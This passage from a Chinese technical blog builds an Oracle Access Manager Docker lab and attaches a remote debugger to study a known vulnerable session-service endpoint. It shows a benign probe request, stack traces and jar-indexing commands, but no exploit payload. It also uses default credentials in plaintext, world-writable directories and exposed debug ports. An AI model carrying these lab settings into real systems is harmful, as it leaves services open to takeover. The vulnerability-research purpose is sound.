container-registry.oracle.com/middleware/oam:12.2.1.4.0 ③创建容器一oamadmin 参考教程创建OAM Administration Server Container，其中包含WebLogic 和OAM Consoles.\n1 2 3 4 5 6 7 8 sudo docker images sudo docker network create -d bridge OamNET # 14f104a67b0819335f9490dadc3e4003540bcdbb7b19436b2aea56250a5f2713 sudo mkdir -p /scratch/user_projects sudo chmod 777 /scratch/user_projects sudo docker run -d --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=127.0.0.1:1521/ORCLCDB.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=password --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=password -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 可能会连不上，使用以下命令调试，看看错误是什么\n1 sudo docker run --rm --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=127.0.0.1:1521/ORCLCDB.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=password --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=password -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 报错及解决 报错一：无法连接数据库 1 2 Unable to connect to the database using the provided details. Enter a valid hostname and port or check if the listener is up and running 解决一：使用正确的IP 需要注意CONNECTION_STRING是从新建的容器中访问的，所以给的IP应该是容器网卡的网关或者主机的，比如 172.17.0.1，而不是127.0.0.1。\n报错二：无法连接CDB 1 The selected Oracle database is a multitenant container database (CDB). Connecting to a multitenant container database (CDB) is not supported. Instead, connect to a valid pluggable database (PDB). 解决二：使用PDB PDB和CDB是Oracle12的新特性，CDB是多租的。Oracle 数据库 12 c 多租户选项允许单个容器数据库 （CDB） 来承载多个单独的可插拔数据库 (PDB)。\n——https://www.cnblogs.com/kerrycode/p/3386917.html\n使用以下语句查看自己是否是所租数据库\n1 select name, decode(cdb, \u0026#39;YES\u0026#39;, \u0026#39;Multitenant Option enabled\u0026#39;, \u0026#39;Regular 12c Database: \u0026#39;) \u0026#34;Multitenant Option\u0026#34; , open_mode, con_id from v$database; 结果\n1 2 3 NAME Multitenant Option OPEN_MODE CON_ID --------- -------------------------- -------------------- ---------- ORCLCDB Multitenant Option enabled READ WRITE 0 或者直接\n1 select cdb from v$database YES表示该数据库是CDB,如果是NO表示是NO-CDB(普通数据库)\n或者执行\n1 show pdbs; 结果\n1 2 3 CON_ID CON_NAME OPEN MODE RESTRICTED ---------- ------------------------------ ---------- ---------- 2 PDB$SEED READ ONLY NO 搜索 “how to connect to pdb directly” ，参考此文 想到通过新建服务连接到PDB。然后注意到/u01/app/oracle/product/12.2.0/dbhome_1/admin/ORCLCDB/tnsnames.ora 文件内容如下，其中已经包括两个Service。\n1 2 ORCLCDB = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = ORCLCDB.localdomain) ) ) ORCLPDB1 = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = ORCLPDB1.localdomain) ) ) 所以只要，创建容器时CONNECTION_STRING 使用 172.17.0.1:1521/ORCLPDB1.localdomain 而不是 172.17.0.1:1521/ORCLCDB.localdomain 就能解决这个错误。\n报错三：无法执行SQL 1 2 3 ERROR - RCU-6005 Unable to execute sql query. CAUSE - RCU-6005 Database not in open state. ACTION - RCU-6005 Make sure that the database is open. 解决三：打开PDB 为了解决报错而胡乱操作了数据库，其中一个动作关闭了PDB，从而导致了这个错误。打开它就好了。\nSQL\u0026gt; select name,open_mode from v$pdbs;\n1 2 3 4 5 6 NAME -------------------------------------------------------------------------------- OPEN_MODE ---------- ORCLPDB1 MOUNTED SQL\u0026gt; alter pluggable database ORCLPDB1 open;\n1 Pluggable database altered. SQL\u0026gt; select name,open_mode from v$pdbs;\n1 2 3 4 5 6 NAME -------------------------------------------------------------------------------- OPEN_MODE ---------- ORCLPDB1 READ WRITE 报错四：创建domain失败 日志详情：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain RCUPREFIX=OAM1 DOMAIN_HOME=/u01/oracle/user_projects/domains/access_domain INFO: Admin Server not configured. Will run RCU and Domain Configuration Phase... Configuring Domain for first time Start the Admin and Managed Servers ===================================== Loading RCU Phase ================= CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain RCUPREFIX=OAM1 jdbc_url=jdbc:oracle:thin:@172.17.0.1:1521/ORCLPDB1.localdomain Creating Domain 1st execution Loading RCU into database with RCUPREFIX OAM1 Domain Configuration Phase ========================== /u01/oracle/oracle_common/common/bin/wlst.sh -skipWLSModuleScanning /u01/oracle/dockertools/create_domain.py -oh /u01/oracle -jh /u01/jdk -parent /u01/oracle/user_projects/domains -name access_domain -user weblogic -password password -rcuDb 172.17.0.1:1521/ORCLPDB1.localdomain -rcuPrefix OAM1 -rcuSchemaPwd password -isSSLEnabled true Cmd is /u01/oracle/oracle_common/common/bin/wlst.sh -skipWLSModuleScanning /u01/oracle/dockertools/create_domain.py -oh /u01/oracle -jh /u01/jdk -parent /u01/oracle/user_projects/domains -name access_domain -user weblogic -password password -rcuDb 172.17.0.1:1521/ORCLPDB1.localdomain -rcuPrefix OAM1 -rcuSchemaPwd password -isSSLEnabled true Initializing WebLogic Scripting Tool (WLST) ... Welcome to WebLogic Server Administration Scripting Shell Type help() for help on available commands create_domain.py called with the following inputs: INFO: sys.argv[0] = /u01/oracle/dockertools/create_domain.py INFO: sys.argv[1] = -oh INFO: sys.argv[2] = /u01/oracle INFO: sys.argv[3] = -jh INFO: sys.argv[4] = /u01/jdk INFO: sys.argv[5] = -parent INFO: sys.argv[6] = /u01/oracle/user_projects/domains INFO: sys.argv[7] = -name INFO: sys.argv[8] = access_domain INFO: sys.argv[9] = -user INFO: sys.argv[10] = weblogic INFO: sys.argv[11] = -password INFO: sys.argv[12] = password INFO: sys.argv[13] = -rcuDb INFO: sys.argv[14] = 172.17.0.1:1521/ORCLPDB1.localdomain INFO: sys.argv[15] = -rcuPrefix INFO: sys.argv[16] = OAM1 INFO: sys.argv[17] = -rcuSchemaPwd INFO: sys.argv[18] = password INFO: sys.argv[19] = -isSSLEnabled INFO: sys.argv[20] = true INFO: Creating Admin server... INFO: Enabling SSL PORT for AdminServer... Error: set() failed. Do dumpStack() to see details. Error: runCmd() failed. Do dumpStack() to see details. Problem invoking WLST - Traceback (innermost last): File \u0026#34;/u01/oracle/dockertools/create_domain.py\u0026#34;, line 513, in ? File \u0026#34;/u01/oracle/dockertools/create_domain.py\u0026#34;, line 123, in createOAMDomain File \u0026#34;/u01/oracle/dockertools/create_domain.py\u0026#34;, line 184, in createBaseDomain File \u0026#34;/tmp/WLSTOfflineIni5785928536971827845.py\u0026#34;, line 79, in set File \u0026#34;/tmp/WLSTOfflineIni5785928536971827845.py\u0026#34;, line 19, in command at com.oracle.cie.domain.script.jython.CommandExceptionHandler.handleException(CommandExceptionHandler.java:69) at com.oracle.cie.domain.script.jython.WLScriptContext.handleException(WLScriptContext.java:3085) at com.oracle.cie.domain.script.jython.WLScriptContext.runCmd(WLScriptContext.java:738) at sun.reflect.GeneratedMethodAccessor132.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) com.oracle.cie.domain.script.jython.WLSTException: com.oracle.cie.domain.script.jython.WLSTException Domain Creation Failed.. Please check the Domain Logs 可以从48行看到是在 Creating Admin server... 阶段出错的。\n解决四：提高ADMIN_PASSWORD 密码复杂度 需要注意的是每次失败重试之前要先删除之前留下的痕迹。\n1 2 sudo docker rm oamadmin sudo rm -rf /scratch/user_projects/* 从这里 https://github.com/oracle/docker-images/issues/844#issuecomment-389884511 看到可能是密码复杂度不够，导致无法设置密码。\n启动容器的命令改为以下。将其中 ADMIN_PASSWORD 和 DB_SCHEMA_PASSWORD 的复杂度变高。\n其中ADMIN_PASSWORD 应该是weblogic管理台的密码。DB_SCHEMA_PASSWORD 是 password you want to set for the RCU schemas 。\n那么什么是RCU schemas 呢？什么是RCU呢？不太理解，先跳过。\nRepository Creation Utility is a graphical and CLI-based tool used to create and manage Oracle Fusion Middleware database schemas.\n改进两个密码的复杂度重新创建容器。\n1 sudo docker run -d --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Dbsch3m@ -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 并使用 sudo docker logs -ft oamadmin 查看新建过程打印出来的日志，看到问题得到了解决。\n报错五：创建domain失败 可以看到前几个步骤都顺利完成了，但也出现了新的问题。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 类似前文日志 INFO: Creating Admin server... INFO: Enabling SSL PORT for AdminServer... Creating Node Managers... Will create Base domain at /u01/oracle/user_projects/domains/access_domain Writing base domain... Base domain created at /u01/oracle/user_projects/domains/access_domain Extending domain at /u01/oracle/user_projects/domains/access_domain Database 172.17.0.1:1521/ORCLPDB1.localdomain Apply Extension templates Extension Templates added Extension Templates added Deleting oam_server1 The default oam_server1 coming from the oam extension template deleted Deleting oam_policy_mgr1 The default oam_server1 coming from the oam extension template deleted Configuring JDBC Templates ... Configuring the Service Table DataSource... fmwDatabase jdbc:oracle:thin:@172.17.0.1:1521/ORCLPDB1.localdomain Getting Database Defaults... Error: getDatabaseDefaults() failed. Do dumpStack() to see details. Error: runCmd() failed. Do dumpStack() to see details. Problem invoking WLST - Traceback (innermost last): File \u0026#34;/u01/oracle/dockertools/create_domain.py\u0026#34;, line 513, in ? File \u0026#34;/u01/oracle/dockertools/create_domain.py\u0026#34;, line 124, in createOAMDomain File \u0026#34;/u01/oracle/dockertools/create_domain.py\u0026#34;, line 328, in extendOamDomain File \u0026#34;/u01/oracle/dockertools/create_domain.py\u0026#34;, line 259, in configureJDBCTemplates File \u0026#34;/tmp/WLSTOfflineIni7074819690261705056.py\u0026#34;, line 267, in getDatabaseDefaults File \u0026#34;/tmp/WLSTOfflineIni7074819690261705056.py\u0026#34;, line 19, in command Failed to build JDBC Connection object: at com.oracle.cie.domain.script.jython.CommandExceptionHandler.handleException(CommandExceptionHandler.java:69) at com.oracle.cie.domain.script.jython.WLScriptContext.handleException(WLScriptContext.java:3085) at com.oracle.cie.domain.script.jython.WLScriptContext.runCmd(WLScriptContext.java:738) at sun.reflect.GeneratedMethodAccessor132.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) com.oracle.cie.domain.script.jython.WLSTException: com.oracle.cie.domain.script.jython.WLSTException: Got exception when auto configuring the schema component(s) with data obtained from shadow table: Failed to build JDBC Connection object: Domain Creation Failed.. Please check the Domain Logs 解决五：修改DB_SCHEMA_PASSWORD 从日志看到是在 Getting Database Defaults... 阶段出现的问题，搜索 getDatabaseDefaults() failed. Do dumpStack() to see details. 发现这个github issue有讨论。\n看到有人说是 schema password 的问题，于是随便改DB_SCHEMA_PASSWORD ，改成Oradoc_db1 还是不行，改成Oradoc_db2就可以了，我也不知道是什么原因😓不解\n总之呢，用这个命令，就可以跑起来三个容器中的第一个了！\n1 sudo docker run -d --network=OamNET -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 成果 ④创建容器二oamms 1 sudo docker run -d -p 14100:14100 --network=OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=14100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_server1 --env MS_HOST=oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 \u0026#34;/u01/oracle/dockertools/startMS.sh\u0026#34; ⑤创建容器三oampolicy 1 sudo docker run -d -p 15100:15100 --network=OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=15100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_policy_mgr1 --env MS_HOST=oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 \u0026#34;/u01/oracle/dockertools/startMS.sh\u0026#34; ⑥验证服务可用性 1 sudo docker inspect -f \u0026#39;{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}\u0026#39; oamadmin oamms oampolicy myOracleDB Console or Page URL WebLogic Administration Console http://\u0026lt;oamadmin_ip\u0026gt;:7001/console Oracle Enterprise Manager Console http://\u0026lt;oamadmin_ip\u0026gt;:7001/em Oracle Access Management Console http://\u0026lt;oamadmin_ip\u0026gt;:7001/oamconsole OAM Server Logout http://\u0026lt;oamms_ip\u0026gt;:14100/oam/server/logout Policy Manager Access http://\u0026lt;oampolicy_ip\u0026gt;:15100/access 各服务截图\n⑦启停与删除 启停\n1 2 sudo docker stop oamadmin oamms oampolicy myOracleDB sudo docker start oamadmin oamms oampolicy myOracleDB 删除\n1 2 3 sudo docker stop oamadmin oamms oampolicy myOracleDB sudo docker rm oamadmin oamms oampolicy myOracleDB sudo rm -rf /scratch/user_projects 远程调试OAM 本章节描述了拥有一个本地运行的OAM之后开启远程调试，以及从仅知道漏洞接口，到定位漏洞主机/容器、定位漏洞进程、定位漏洞代码、再到下载部署包和搭建调试项目，到最终能够顺利进行无源码远程调试的详细过程。其中也体现了Java web远程调试的基本流程和思路。\n大纲 OAM包括多个容器，我们需要先定位出来分析这个漏洞所需要关注的容器和进程，以调试模式重启该进程，将调试端口从容器中暴露给用于调试的主机，然后将对应进程的部署包和依赖包下载到调试主机，最后通过idea进行常规的Java web远程无源码动态调试。\n步骤汇总 参照 ”附录一：本地搭建OAM运行环境“ 的 ”步骤汇总“ 章节，但在 ”步骤汇总“ 章节中的第7步使用以下命令新建容器，在原命令基础上增加暴露出来容器的调试端口。 1 2 3 4 docker run -d -it --name myOracleDB -p 8451:8453 -p 1521:1521 store/oracle/database-enterprise:12.2.0.1 docker run -d --network=OamNET -p 8452:8453 -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 docker run -d -p 14100:14100 -p 8453:8453 --network=OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=14100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_server1 --env MS_HOST=oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 \u0026#34;/u01/oracle/dockertools/startMS.sh\u0026#34; docker run -d -p 15100:15100 -p 8454:8453 --network=OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=15100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_policy_mgr1 --env MS_HOST=oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 \u0026#34;/u01/oracle/dockertools/startMS.sh\u0026#34; 修改oamms容器中的/u01/oracle/user_projects/domains/access_domain/bin/setDomainEnv.sh 文件，在debugFlag变量被使用之前将其赋值为true。大约是在第419行这个空白行添加 debugFlag=\u0026quot;true\u0026quot; 。 重启oamms容器： docker restart oamms 将oamms容器中的 /u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/*.jar 和 /u01/oracle/coherence/lib/*.jar 下载到调试主机，添加到调试项目的library中。 在oamms容器中生成 wlfullclient.jar ，下载到调试主机，添加到调试项目的library中。 通过 docker exec oamms tail -f /u01/oracle/user_projects/domains/access_domain/logs/oam_server1-ms-oamms.log 查看错误日志 idea启动调试 在 oracle.security.am.pbl.transport.http.AMServlet#doPost 下断点 通过 curl -XPOST http://192.168.175.139:14100/oam/server/opensso/sessionservice 发送请求 这个时候idea就能成功捕获到断点了。 ①需要关注的容器和进程 由漏洞作者分析文章知道存在漏洞的接口为 /oam/server/opensso/sessionservice ，结合OAM搭建文档的服务验证环节，知道是oamms容器expose的14100端口上web应用的问题，故尝试调试该容器的web应用。\n修改oamms容器中的/u01/oracle/user_projects/domains/access_domain/bin/setDomainEnv.sh 文件以将oamms中Java进程切换到可调试模式。方便我们通过idea挂载到oamms中对存在漏洞的Java进程进行远程调试。\n在空白行419行添加debugFlag=\u0026quot;true\u0026quot; 。容器中没有vim , ps , netstat 等工具，可以使用 yum install vim net-tools 进行安装。\n然后执行docker restart oamms，重启完成后进入容器可以看到进程已经以调试模式启动，并且监听在8453端口。\n但是此时oamms容器中的8453端口并没有expose出来。\n尝试通过将当前oamms容器保存为镜像，再重新启动的方式来添加映射端口：\n1 2 3 4 5 6 docker stop oamms docker commit oamms myoamms-image docker container rm oamms docker run -itd -name oamms -p 8453:8453 -p 14100:14100 myoamms-image docker run -itd -n oamms -p 8453:8453 -p 14100:14100 myoamms-image docker run -itd --name oamms -p 8453:8453 -p 14100:14100 myoamms-image 但似乎没有成功，界面一直停留在 Waiting for WebLogic Admin Server on oamadmin/7001 to become available... ，可能是新建的容器IP变动导致的网络通信的问题。\n干脆重新部署，在新建各个容器的时候添加映射端口。\n1 2 3 4 docker run -d -it --name myOracleDB -p 8451:8453 -p 1521:1521 store/oracle/database-enterprise:12.2.0.1 docker run -d --network=OamNET -p 8452:8453 -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 docker run -d -p 14100:14100 -p 8453:8453 --network=OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=14100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_server1 --env MS_HOST=oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 \u0026#34;/u01/oracle/dockertools/startMS.sh\u0026#34; docker run -d -p 15100:15100 -p 8454:8453 --network=OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=15100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_policy_mgr1 --env MS_HOST=oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 \u0026#34;/u01/oracle/dockertools/startMS.sh\u0026#34; 重新部署后按照上述修改/u01/oracle/user_projects/domains/access_domain/bin/setDomainEnv.sh 后重启oamms容器，将oamms改成调试模式启动。\n②监控web应用日志 从docker logs -f oamms 可以看到oamms的web应用日志在/u01/oracle/user_projects/domains/access_domain/logs/这个文件夹中，访问应用时最新出现改变的文件是oam_server1-ms-oamms.log。\n因此执行\n1 docker exec oamms tail -f /u01/oracle/user_projects/domains/access_domain/logs/oam_server1-ms-oamms.log ③向漏洞接口发送基本请求 参考漏洞作者分析文章 ，向OAMMS发送一个 /oam/server/opensso/sessionservice 所能接受和处理的基本请求\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /oam/server/opensso/sessionservice HTTP/1.1 Host: 192.168.175.139:14100 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36 Connection: close Accept-Language: zh-CN,zh;q=0.9 Content-Type: text/xml Content-Length: 294 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;RequestSet vers=\u0026#34;vers123\u0026#34; svcid=\u0026#34;session\u0026#34; reqid=\u0026#34;req_1\u0026#34;\u0026gt; \u0026lt;Request dtdid=\u0026#34;dtd1\u0026#34; sid=\u0026#34;sid1\u0026#34;\u0026gt;\u0026lt;![CDATA[ \u0026lt;authIdentifier reqid=\u0026#34;1\u0026#34; requester=\u0026#34;YWJjZA==\u0026#34;\u0026gt; \u0026lt;SessionID\u0026gt;123\u0026lt;/SessionID\u0026gt; \u0026lt;/authIdentifier\u0026gt; ]]\u0026gt; \u0026lt;/Request\u0026gt; \u0026lt;/RequestSet\u0026gt; 看到日志中的报错调用栈为\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 \u0026lt;Mar 22, 2022 2:33:02,196 AM GMT\u0026gt; \u0026lt;Warning\u0026gt; \u0026lt;oracle.oam.binding\u0026gt; \u0026lt;BEA-000000\u0026gt; \u0026lt;Error while processing Master Controller in PBL java.lang.NullPointerException ★ at oracle.security.am.proxy.opensso.events.OpenssoCheckValidSessionEvent.isRequesterSessionID(OpenssoCheckValidSessionEvent.java:58) at oracle.security.am.proxy.opensso.controller.OpenssoFlowController.getNextEventHint(OpenssoFlowController.java:515) at oracle.security.am.controller.events.AbstractEventFlowController.getEventHint(AbstractEventFlowController.java:193) at oracle.security.am.controller.events.AbstractEventFlowController.getSuccessFailEvent(AbstractEventFlowController.java:158) at oracle.security.am.controller.events.AbstractEventFlowController.getNextEvent(AbstractEventFlowController.java:99) at oracle.security.am.controller.MasterController.getNextEvent(MasterController.java:236) at oracle.security.am.controller.MasterController.processEvent(MasterController.java:615) at oracle.security.am.controller.MasterController.processRequest(MasterController.java:788) at oracle.security.am.controller.MasterController.process(MasterController.java:708) at oracle.security.am.pbl.PBLFlowManager.delegateToMasterController(PBLFlowManager.java:221) at oracle.security.am.pbl.PBLFlowManager.handleBaseEvent(PBLFlowManager.java:147) at oracle.security.am.pbl.PBLFlowManager.processRequest(PBLFlowManager.java:107) at oracle.security.am.pbl.transport.http.AMServlet.handleRequest(AMServlet.java:221) ★ at oracle.security.am.pbl.transport.http.AMServlet.doPost(AMServlet.java:177) at javax.servlet.http.HttpServlet.service(HttpServlet.java:707) at javax.servlet.http.HttpServlet.service(HttpServlet.java:790) at weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:295) at weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:260) at weblogic.servlet.internal.StubSecurityHelper.invokeServlet(StubSecurityHelper.java:137) at weblogic.servlet.internal.ServletStubImpl.execute(ServletStubImpl.java:353) at weblogic.servlet.internal.TailFilter.doFilter(TailFilter.java:25) at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78) at oracle.security.jps.ee.http.JpsAbsFilter$3.run(JpsAbsFilter.java:175) at java.security.AccessController.doPrivileged(Native Method) at oracle.security.jps.util.JpsSubject.doAsPrivileged(JpsSubject.java:315) at oracle.security.jps.ee.util.JpsPlatformUtil.runJaasMode(JpsPlatformUtil.java:650) at oracle.security.jps.ee.http.JpsAbsFilter.runJaasMode(JpsAbsFilter.java:112) at oracle.security.jps.ee.http.JpsAbsFilter.doFilterInternal(JpsAbsFilter.java:293) at oracle.security.jps.ee.http.JpsAbsFilter.doFilter(JpsAbsFilter.java:150) at oracle.security.jps.ee.http.JpsFilter.doFilter(JpsFilter.java:94) at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78) at oracle.dms.servlet.DMSServletFilter.doFilter(DMSServletFilter.java:248) at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78) at oracle.jrf.servlet.ExtensibleGlobalFilter.doFilter(ExtensibleGlobalFilter.java:92) at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78) at weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.wrapRun(WebAppServletContext.java:3797) at weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.run(WebAppServletContext.java:3763) at weblogic.security.acl.internal.AuthenticatedSubject.doAs(AuthenticatedSubject.java:344) at weblogic.security.service.SecurityManager.runAsForUserCode(SecurityManager.java:197) at weblogic.servlet.provider.WlsSecurityProvider.runAsForUserCode(WlsSecurityProvider.java:203) at weblogic.servlet.provider.WlsSubjectHandle.run(WlsSubjectHandle.java:71) at weblogic.servlet.internal.WebAppServletContext.doSecuredExecute(WebAppServletContext.java:2451) at weblogic.servlet.internal.WebAppServletContext.securedExecute(WebAppServletContext.java:2299) at weblogic.servlet.internal.WebAppServletContext.execute(WebAppServletContext.java:2277) at weblogic.servlet.internal.ServletRequestImpl.runInternal(ServletRequestImpl.java:1720) at weblogic.servlet.internal.ServletRequestImpl.run(ServletRequestImpl.java:1680) at weblogic.servlet.provider.ContainerSupportProviderImpl$WlsRequestExecutor.run(ContainerSupportProviderImpl.java:272) at weblogic.invocation.ComponentInvocationContextManager._runAs(ComponentInvocationContextManager.java:352) at weblogic.invocation.ComponentInvocationContextManager.runAs(ComponentInvocationContextManager.java:337) at weblogic.work.LivePartitionUtility.doRunWorkUnderContext(LivePartitionUtility.java:57) at weblogic.work.PartitionUtility.runWorkUnderContext(PartitionUtility.java:41) at weblogic.work.SelfTuningWorkManagerImpl.runWorkUnderContext(SelfTuningWorkManagerImpl.java:655) at weblogic.work.ExecuteThread.execute(ExecuteThread.java:420) at weblogic.work.ExecuteThread.run(ExecuteThread.java:360) ④确定关键断点的位置和相关的依赖包 从报错调用栈可以看到接口 /oam/server/opensso/sessionservice 是由 oracle.security.am.pbl.transport.http.AMServlet.doPost(AMServlet.java:177) 处理的，我们想知道这个类位于那个jar包中，以及整个请求处理过程依赖哪些jar包。\n尝试以下方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 // 1. 生成容器中所有jar包内容的index # docker exec oamms find / -name *.jar 2\u0026gt;/dev/null -exec sh -c \u0026#34;echo {};zipinfo -1 {} | grep -Pi \u0026#39;\\.(class|java|xml|conf|json|yaml|yml|config)$\u0026#39;;echo \u0026#39;---\u0026#39;; \u0026#34; \\; \u0026gt; oamms_tree.txt // index大致内容如下，用---分隔jar包，每个区块第一行是jar包名称，后续跟着class/java/config等代码和配置文件 # tail -n 20 oamms_tree.txt com/sun/tools/visualvm/coredump/resources/layer.xml --- /u01/jdk/lib/visualvm/visualvm/core/com-sun-tools-visualvm-modules-startup.jar com/sun/tools/visualvm/modules/startup/AcceptLicense$1.class 